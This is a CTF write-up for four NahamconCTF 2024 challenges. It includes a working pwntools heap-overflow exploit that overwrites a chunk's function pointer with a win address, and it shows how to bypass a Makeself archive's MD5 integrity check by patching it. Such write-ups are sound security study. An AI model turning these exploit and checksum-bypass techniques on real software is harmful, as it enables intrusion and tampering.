---
layout: writeup
category: NahamconCTF
chall_description: 
points: 
solves: 
tags: nahamcom rev pwn foren
date: 2024-06-11
comments: false
---


## Twine

Hexdump of file reveals the flag
![Branching](/assets/CTFs/NahamconCTF/twine.png)


## So much cache

Basic heap overflow
Input reads 3 times the size of malloc.

![Branching](/assets/CTFs/NahamconCTF/so-much-cache1.png)


Case 4 creates malloc and case 5 calls from the address stored in the allocated chunk, as this chunk will be created just below our first chunk, we can overflow in the second chunk and put address of the win function there.

Using case 5 we can call the address stored on second chunk.

![Branching](/assets/CTFs/NahamconCTF/so-much-cache2.png)


Here is the solve script I used to get the flag.

```py 
from pwn import *
 
context.update(arch='i386')
exe = '/home/kali/practice/CTF/NahmconCTF/24/so_much_cache'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        print(argv)
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: # ['server', 'port']
        return remote(sys.argv[1], sys.argv[2], *a, **kw) 
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
 
b main
b *0x0000000000400c00
'''.format(**locals()) 

io = start() 

io.sendlineafter(b"| select [1-5] : ", b"1")
io.sendlineafter(b"[?] size : ", b"24")

payload = b"\x90"*32 + p64(0x00000000004009ae) 

io.sendlineafter(b"[?] data : ", payload)
io.sendlineafter(b"| select [1-5] : ", b"4")
io.sendlineafter(b"| select [1-5] : ", b"5")
io.sendlineafter(b"Where do you want to jump? (1, 2, or 3)\n", b"1")

flag = io.recvline().strip().decode()
log.success(f"Flag: {flag}") 

```



## The Box


This was an interesting challenge as this was my first time dealing with POSIX shell script.

![Branching](/assets/CTFs/NahamconCTF/thebox1.png)


The binary asks for a pin, and creates source code at runtime which is stored in `/tmp` directory.

![Branching](/assets/CTFs/NahamconCTF/thebox2.png)


We can analyze the file `thebox.py` and get the pin.
![Branching](/assets/CTFs/NahamconCTF/thebox3.png)


Using the pin to get the flag.

![Branching](/assets/CTFs/NahamconCTF/thebox4.png)



## Locked Box

Executing the file gives us MD5 checksum error.

```sh
┌──(kali㉿kali)-[~/practice/CTF/NahmconCTF/24]
└─$ ./lockedbox
Verifying archive integrity...  100%  Error in MD5 checksums: 7fadba346fd6990fa28ed1422e058e89 is different from adba346fd6990fa28ed1422e058e89

```

Echoing first 20 lines of the file shows us the md5 hash being stored in binary.

```sh
┌──(kali㉿kali)-[~/practice/CTF/NahmconCTF/24]
└─$ head -n 20 lockedbox
#!/bin/sh
# This script was generated using Makeself 2.5.0
# The license covering this archive and its contents, if any, is wholly independent of the Makeself license (GPL)

ORIG_UMASK=`umask`
if test "n" = n; then
    umask 077
fi

CRCsum="1121865259"
MD5="adba346fd6990fa28ed1422e058e89"
SHA="0000000000000000000000000000000000000000000000000000000000000000"
SIGNATURE=""
TMPROOT=${TMPDIR:=/tmp}
USER_PWD="$PWD"
export USER_PWD
ARCHIVE_DIR=`dirname "$0"`
export ARCHIVE_DIR

label="lockedbox"

```


We can edit the binary using Ghidra or any hexeditor. I used Ghidra to change the MD5 hash.

![Branching](/assets/CTFs/NahamconCTF/lockedbox1.png)

And we get the flag.
```sh
┌──(kali㉿kali)-[~/practice/CTF/NahmconCTF/24]
└─$ ./lockedbox.ghidra.patch.bin 
Verifying archive integrity...  100%   MD5 checksums are OK. All good.
Uncompressing lockedbox  100%  
flag{3a50c5e41a1c3eee6dcddca9e04992e0}

```




